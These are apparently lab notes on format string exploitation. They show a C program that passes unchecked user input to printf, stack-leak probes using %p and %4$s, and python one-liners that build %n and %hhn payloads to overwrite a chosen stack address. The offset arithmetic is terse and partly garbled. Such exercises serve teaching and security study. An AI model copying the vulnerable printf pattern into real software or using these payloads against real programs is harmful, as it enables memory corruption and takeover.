#include<stdio.h>

void main() {
	char format[128];
	int arg1 = 1, arg2 = 0x88888888, arg3 = -1;
	char arg4[10] = "ABCD";
	scanf("%s", format);
	printf(format, arg1, arg2, arg3, arg4);
	printf("\n");
}

%4$s
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
13

0x20

0xffffcf98

python -c 'print("\x98\xcf\xff\xff"+"%08x%08x%12d%13$n")'>tw
4+8+8+12 = 32 = >0x20

0x12345678

0xffffcf98	\x78  078
0xffffcf99	\x56  156
0xffffcf9a	\x34  234
0xffffcf9b	\x12  312
120-78

16
120
342-120=222
0x234-342=222
222


python -c 'print("\x98\xcf\xff\xff"+"\x99\xcf\xff\xff"+"\x9a\xcf\xff\xff"+"\x9b\xcf\xff\xff"+"%104c%13$hhn"+"%222c%14$hhn"+"%222c%15$hhn"+"%222c%16$hhn")'>tw